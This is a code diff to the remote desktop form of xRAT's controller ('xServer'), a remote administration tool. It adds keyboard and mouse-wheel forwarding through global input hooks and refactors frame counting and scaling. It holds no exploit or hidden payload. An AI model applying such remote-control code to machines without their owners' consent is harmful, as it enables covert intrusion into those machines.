@@ -1,26 +1,35 @@
 ﻿using System;
-using System.Diagnostics;
 using System.Drawing;
 using System.Windows.Forms;
+using System.Collections.Generic;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
 using xServer.Core.Utilities;
+using xServer.Core.MouseKeyHook;
 using xServer.Enums;
 
 namespace xServer.Forms
 {
+    //TODO: Fix Alt + Tab
     public partial class FrmRemoteDesktop : Form
     {
+        public bool IsStarted { get; private set; }
         private readonly Client _connectClient;
         private bool _enableMouseInput;
-        private bool _started;
-        private FrameCounter _frameCounter;
-        private Stopwatch _sWatch;
+        private bool _enableKeyboardInput;
+        private IKeyboardMouseEvents _mEvents;
+        private List<Keys> _keysPressed;
 
         public FrmRemoteDesktop(Client c)
         {
             _connectClient = c;
             _connectClient.Value.FrmRdp = this;
+
+            if (PlatformHelper.RunningOnMono)
+                SubscribeMonoEvents();
+            else
+                SubscribeWindowsHookEvents();
+
             InitializeComponent();
         }
 
@@ -28,57 +37,56 @@ namespace xServer.Forms
         {
             this.Text = WindowHelper.GetWindowTitle("Remote Desktop", _connectClient);
 
-            panelTop.Left = (this.Width/2) - (panelTop.Width/2);
+            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);
 
-            btnHide.Left = (panelTop.Width/2) - (btnHide.Width/2);
+            btnHide.Left = (panelTop.Width / 2) - (btnHide.Width / 2);
 
             btnShow.Location = new Point(377, 0);
-            btnShow.Left = (this.Width/2) - (btnShow.Width/2);
+            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);
+
+            _keysPressed = new List<Keys>();
 
             if (_connectClient.Value != null)
                 new Core.Packets.ServerPackets.GetMonitors().Execute(_connectClient);
         }
 
-        public void AddMonitors(int montiors)
+        private void SubscribeWindowsHookEvents()
+        {
+            _mEvents = Hook.GlobalEvents();
+            _mEvents.MouseWheel += OnMouseWheelMove;
+            _mEvents.KeyDown += OnKeyDown;
+            _mEvents.KeyUp += OnKeyUp;
+        }
+
+        private void SubscribeMonoEvents()
+        {
+            this.KeyDown += OnKeyDown;
+            this.KeyUp += OnKeyUp;
+        }
+
+        private void UnsubscribeWindowsHookEvents()
+        {
+            if (_mEvents == null) return;
+            _mEvents.MouseWheel -= OnMouseWheelMove;
+            _mEvents.KeyDown -= OnKeyDown;
+            _mEvents.KeyUp -= OnKeyUp;
+        }
+
+        private void UnsubscribeMonoEvents()
+        {
+            this.KeyDown -= OnKeyDown;
+            this.KeyUp -= OnKeyUp;
+        }
+
+        public void AddMonitors(int monitors)
         {
             try
             {
-                cbMonitors.Invoke((MethodInvoker) delegate
+                cbMonitors.Invoke((MethodInvoker)delegate
                 {
-                    for (int i = 0; i < montiors; i++)
+                    for (int i = 0; i < monitors; i++)
                         cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
                     cbMonitors.SelectedIndex = 0;
-                });
-            }
-            catch (InvalidOperationException)
-            {
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show(
-                    string.Format(
-                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
-                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
-        }
-
-        private void CountFps()
-        {
-            var deltaTime = (float)_sWatch.Elapsed.TotalSeconds;
-            _sWatch = Stopwatch.StartNew();
-
-            _frameCounter.Update(deltaTime);
-
-            UpdateFps(_frameCounter.AverageFramesPerSecond);
-        }
-
-        private void UpdateFps(float fps)
-        {
-            try
-            {
-                this.Invoke((MethodInvoker)delegate
-                {
-                    this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Desktop", _connectClient), fps.ToString("0.00"));
                 });
             }
             catch (InvalidOperationException)
@@ -88,38 +96,29 @@ namespace xServer.Forms
 
         public void UpdateImage(Bitmap bmp, bool cloneBitmap = false)
         {
+            picDesktop.UpdateImage(bmp, cloneBitmap);
+        }
+
+        private void _frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
+        {
             try
             {
-                CountFps();
-                picDesktop.Invoke((MethodInvoker) delegate
+                this.Invoke((MethodInvoker)delegate
                 {
-                    // get old image to dispose it correctly
-                    var oldImage = picDesktop.Image;
-
-                    picDesktop.Image = cloneBitmap ? (Bitmap) bmp.Clone() : bmp;
-
-                    if (oldImage != null)
-                        oldImage.Dispose();
+                    this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Desktop", _connectClient), e.CurrentFramesPerSecond.ToString("0.00"));
                 });
             }
             catch (InvalidOperationException)
             {
             }
-            catch (Exception ex)
-            {
-                MessageBox.Show(
-                    string.Format(
-                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
-                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
         }
 
         private void ToggleControls(bool t)
         {
-            _started = !t;
+            IsStarted = !t;
             try
             {
-                this.Invoke((MethodInvoker) delegate
+                this.Invoke((MethodInvoker)delegate
                 {
                     btnStart.Enabled = t;
                     btnStop.Enabled = !t;
@@ -133,12 +132,13 @@ namespace xServer.Forms
 
         private void FrmRemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (_started)
-                new Core.Packets.ServerPackets.GetDesktop(0, 0, RemoteDesktopAction.Stop).Execute(_connectClient);
-            if (_sWatch != null)
-                _sWatch.Stop();
+            if (!picDesktop.IsDisposed && !picDesktop.Disposing)
+                picDesktop.Dispose();
             if (_connectClient.Value != null)
                 _connectClient.Value.FrmRdp = null;
+
+            UnsubscribeWindowsHookEvents();
+            UnsubscribeMonoEvents();
         }
 
         private void FrmRemoteDesktop_Resize(object sender, EventArgs e)
@@ -156,19 +156,28 @@ namespace xServer.Forms
                 return;
             }
 
-            _frameCounter = new FrameCounter();
-            _sWatch = Stopwatch.StartNew();
-
             ToggleControls(false);
 
-            new Core.Packets.ServerPackets.GetDesktop(barQuality.Value, cbMonitors.SelectedIndex, RemoteDesktopAction.Start).Execute(_connectClient);
+            picDesktop.Start();
+
+            // Subscribe to the new frame counter.
+            picDesktop.SetFrameUpdatedEvent(_frameCounter_FrameUpdated);
+
+            this.ActiveControl = picDesktop;
+
+            new Core.Packets.ServerPackets.GetDesktop(barQuality.Value, cbMonitors.SelectedIndex).Execute(_connectClient);
         }
 
         private void btnStop_Click(object sender, EventArgs e)
         {
-            new Core.Packets.ServerPackets.GetDesktop(0, 0, RemoteDesktopAction.Stop).Execute(_connectClient);
             ToggleControls(true);
-            _sWatch.Stop();
+
+            picDesktop.Stop();
+
+            // Unsubscribe from the frame counter. It will be re-created when starting again.
+            picDesktop.UnsetFrameUpdatedEvent(_frameCounter_FrameUpdated);
+
+            this.ActiveControl = picDesktop;
         }
 
         private void barQuality_Scroll(object sender, EventArgs e)
@@ -184,6 +193,8 @@ namespace xServer.Forms
                 lblQualityShow.Text += " (high)";
             else if (value >= 25)
                 lblQualityShow.Text += " (mid)";
+
+            this.ActiveControl = picDesktop;
         }
 
         private void btnMouse_Click(object sender, EventArgs e)
@@ -192,25 +203,59 @@ namespace xServer.Forms
             {
                 this.picDesktop.Cursor = Cursors.Default;
                 btnMouse.Image = Properties.Resources.mouse_delete;
+                toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
                 _enableMouseInput = false;
             }
             else
             {
                 this.picDesktop.Cursor = Cursors.Hand;
                 btnMouse.Image = Properties.Resources.mouse_add;
+                toolTipButtons.SetToolTip(btnMouse, "Disable mouse input.");
                 _enableMouseInput = true;
             }
+
+            this.ActiveControl = picDesktop;
+        }
+
+        private void btnKeyboard_Click(object sender, EventArgs e)
+        {
+            if (_enableKeyboardInput)
+            {
+                this.picDesktop.Cursor = Cursors.Default;
+                btnKeyboard.Image = Properties.Resources.keyboard_delete;
+                toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
+                _enableKeyboardInput = false;
+            }
+            else
+            {
+                this.picDesktop.Cursor = Cursors.Hand;
+                btnKeyboard.Image = Properties.Resources.keyboard_add;
+                toolTipButtons.SetToolTip(btnKeyboard, "Disable keyboard input.");
+                _enableKeyboardInput = true;
+            }
+
+            this.ActiveControl = picDesktop;
+        }
+
+        private int GetRemoteWidth(int localX)
+        {
+            return localX * picDesktop.ScreenWidth / picDesktop.Width;
+        }
+
+        private int GetRemoteHeight(int localY)
+        {
+            return localY * picDesktop.ScreenHeight / picDesktop.Height;
         }
 
         private void picDesktop_MouseDown(object sender, MouseEventArgs e)
         {
-            if (picDesktop.Image != null && _enableMouseInput && !btnStart.Enabled)
+            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
             {
                 int local_x = e.X;
                 int local_y = e.Y;
 
-                int remote_x = local_x*picDesktop.Image.Width/picDesktop.Width;
-                int remote_y = local_y*picDesktop.Image.Height/picDesktop.Height;
+                int remote_x = GetRemoteWidth(local_x);
+                int remote_y = GetRemoteHeight(local_y);
 
                 MouseAction action = MouseAction.None;
 
@@ -228,13 +273,13 @@ namespace xServer.Forms
 
         private void picDesktop_MouseUp(object sender, MouseEventArgs e)
         {
-            if (picDesktop.Image != null && _enableMouseInput && !btnStart.Enabled)
+            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
             {
                 int local_x = e.X;
                 int local_y = e.Y;
 
-                int remote_x = local_x*picDesktop.Image.Width/picDesktop.Width;
-                int remote_y = local_y*picDesktop.Image.Height/picDesktop.Height;
+                int remote_x = GetRemoteWidth(local_x);
+                int remote_y = GetRemoteHeight(local_y);
 
                 MouseAction action = MouseAction.None;
 
@@ -252,13 +297,13 @@ namespace xServer.Forms
 
         private void picDesktop_MouseMove(object sender, MouseEventArgs e)
         {
-            if (picDesktop.Image != null && _enableMouseInput && !btnStart.Enabled)
+            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
             {
                 int local_x = e.X;
                 int local_y = e.Y;
 
-                int remote_x = local_x*picDesktop.Image.Width/picDesktop.Width;
-                int remote_y = local_y*picDesktop.Image.Height/picDesktop.Height;
+                int remote_x = GetRemoteWidth(local_x);
+                int remote_y = GetRemoteHeight(local_y);
 
                 int selectedMonitorIndex = cbMonitors.SelectedIndex;
 
@@ -267,11 +312,50 @@ namespace xServer.Forms
             }
         }
 
+        private void OnMouseWheelMove(object sender, MouseEventArgs e)
+        {
+            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
+            {
+                if (_connectClient != null)
+                    new Core.Packets.ServerPackets.DoMouseEvent(e.Delta == 120 ? MouseAction.ScrollUp : MouseAction.ScrollDown, false, 0, 0, cbMonitors.SelectedIndex).Execute(_connectClient);
+            }
+        }
+
+        private void OnKeyDown(object sender, KeyEventArgs e)
+        {
+            if (picDesktop.Image != null && _enableKeyboardInput && IsStarted && this.ContainsFocus)
+            {
+                e.Handled = true;
+
+                if (_keysPressed.Contains(e.KeyCode))
+                    return;
+
+                _keysPressed.Add(e.KeyCode);
+
+                if (_connectClient != null)
+                    new Core.Packets.ServerPackets.DoKeyboardEvent((byte)e.KeyCode, true).Execute(_connectClient);
+            }
+        }
+
+        private void OnKeyUp(object sender, KeyEventArgs e)
+        {
+            if (picDesktop.Image != null && _enableKeyboardInput && IsStarted && this.ContainsFocus)
+            {
+                e.Handled = true;
+
+                _keysPressed.Remove(e.KeyCode);
+
+                if (_connectClient != null)
+                    new Core.Packets.ServerPackets.DoKeyboardEvent((byte)e.KeyCode, false).Execute(_connectClient);
+            }
+        }
+
         private void btnHide_Click(object sender, EventArgs e)
         {
             panelTop.Visible = false;
             btnShow.Visible = true;
             btnHide.Visible = false;
+            this.ActiveControl = picDesktop;
         }
 
         private void btnShow_Click(object sender, EventArgs e)
@@ -279,6 +363,7 @@ namespace xServer.Forms
             panelTop.Visible = true;
             btnShow.Visible = false;
             btnHide.Visible = true;
+            this.ActiveControl = picDesktop;
         }
     }
 }
